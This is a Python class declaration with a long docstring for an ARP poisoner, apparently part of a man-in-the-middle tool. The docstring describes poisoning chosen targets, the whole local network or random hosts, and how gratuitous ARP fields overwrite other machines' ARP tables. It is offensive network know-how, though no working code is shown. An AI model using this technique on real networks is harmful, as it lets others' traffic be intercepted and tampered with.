class ARPPoisoner:
    """Implementation of a thread-based ARP Poisoner to position this host in the
    middle of the network communications. The only address required is the Gateway's
    IP address, other information needed like local IP, local MAC or other MAC address
    are calculated and/or requested in this class, either thanks to Python modules or ARP packets.
    The __init__ function assigns the Gateway's IP address and NIC. From that information, it also
    sets the local IP, network mask, broadcast address and local MAC Address. The localnet, targets and
    randomize parameters specify which type of ARP Poison is going to be executed. Although this class
    could be instantiated with all three types at the same time, the restriction for only choosing one
    is situated in the ConfigurationLoader class.

        :param interface: Interface to be used by scapy
        :param gateway_ip: Network's gateway IP address
        :param targets: Specify the targets to poison.
        :param localnet: Poison the hole network.
        :param randomize: Poison a number of random hosts on the network.
        :param arp_type: Choose between 'is-at', 'who-is' or both types of Gratuitous ARP to use for poisoning.
        :param verbose: Verbose level for scapy

        :type arp_type: int, str
        :type verbose: int

    Apart from class __init__ arguments, there are another attributes.
    Attributes:
        __layer_two_socket: L2pcapSccket. Socket to send layer 2 packets.
        __layer_three_socket: L3pcapSocket. Socket to send layer 3 packets.
        __my_ip: str. IP from host executing the application.
        __my_mac: str. MAC address from host executing the application.
        __broadcast: str. Broadcast address from the network the host is connected to.
        __netmask: str. Dotted decimal format from the network the host is connected to.
        __gateway_mac: str. MAC address from the gateway.
        __stop: bool. Flag representing if the ARP poisoning must be executed.
        __known_targets: dict. IP => MAC from every known target being poisoned.

    note::
        ARP packets crafted on this class are based on RFC 826 and RFC 5227, so the header fields are built
        following the ARP request, ARP response and Gratuitous ARP standards, which define that:

        On ARP Request:
            - op (Operation): 1 for ARP Request
            - hwsrc: SHA, Sender MAC Address. On request, MAC address from the host that is requesting another MAC
            - psrc: SPA, Sender Protocol Address. On request, IP address from the host that is requesting another MAC
            - hwdst: THA, Target Hardware Address, 00:00:00:00:00:00 for MAC requesting
            - pdst: TPA, Target Protocol Address, IP address from the host whose MAC is being requested

        On ARP Response:
            - op (Operation): 2 for ARP Response
            - hwsrc: SHA, Sender Mac Address. On response, contains the MAC that the ARP Response
                was looking for.
            - psrc: SPA, Sender Protocol Address. On response, contains the IP from that host that responded to
                the ARP Request
            - hwdst: THA, Target Hardware Address. On response, contains the MAC address of the host that
                originated the ARP Request.
            - pdst: TPA, Target Protocol Address. On response, contains the IP address of the host that
                originated the ARP Request.

        On Gratuitous ARP:
            - op (Operation): 1 or 2, depending on the OS architecture, a host will respond to Request or Reply
            - psrc: SPA, Sender Protocol Address. IP whose MAC address will be overridden in all ARP tables.
            - hwsrc: SHA, Sender MAC Address. MAC to override in all ARP tables.
            - hwdst: Ignored, should be 'ff:ff:ff:ff:ff:ff' but it's set on the Ethernet layer.
            . pdst: To follow Gratuitous ARP standard, has to be the same value as SPA (psrc).
